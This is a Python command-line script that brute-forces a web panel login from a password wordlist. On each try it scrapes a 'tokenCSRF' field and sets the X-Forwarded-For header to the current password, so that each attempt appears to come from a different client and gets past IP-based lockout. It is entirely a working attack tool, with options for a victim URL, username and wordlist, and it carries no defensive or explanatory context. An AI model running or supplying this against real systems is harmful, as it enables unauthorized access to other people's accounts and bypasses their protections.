#!/usr/bin/env python3 

import requests
import sys 
import signal
import time
import pdb
import argparse
import re
from termcolor import colored
from pwn import *

# Ctrl + c

def def_handler(sig, frame):

    print(f"\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():

    parser = argparse.ArgumentParser(description='Brute Force - Panel Login')
    parser.add_argument("-t", "--target",dest="target", required=True, help="Victim panel login url (Ex: -t www.example.com/login)")
    parser.add_argument("-u", "--user",dest="username", required=True, help="username's panel login")
    parser.add_argument("-pf", "--passwordsfile",dest="passwordsfile", required=True, help="File contain passwords")

    options = parser.parse_args()

    return options.target, options.username, options.passwordsfile

def brute_force(s, target, username, passwordsfile):



    with open(passwordsfile, "r") as p:
        passwords = p.read().split('\n')

    p1 = log.progress("Brute Force")
    p1.status("Iniciando Fuerza Bruta")

    time.sleep(2)
    
    for password in passwords:

        p1.status("Brute Forceando la password")

        r = s.get(target)
        token = re.findall(r'name="tokenCSRF" value="(.*?)"', r.text)[0]

        post_data = {
            
            'tokenCSRF': token,
            'username': username,
            'password': password,
            'save': ''
        }


        headers = {
            'X-Forwarded-For': '%s' % password
        }

        r = s.post(target, data=post_data, headers=headers)

        if "Username or password incorrect" not in r.text:
            correct_password = password
            break

    return correct_password

def main():

    s = requests.session()
    target, username, passwordsfile = get_arguments()

    correct_password = brute_force(s, target, username, passwordsfile)

    print(f"[+] Para el usuario {username} la password es -> {correct_password}")

if __name__ == '__main__':
    main()
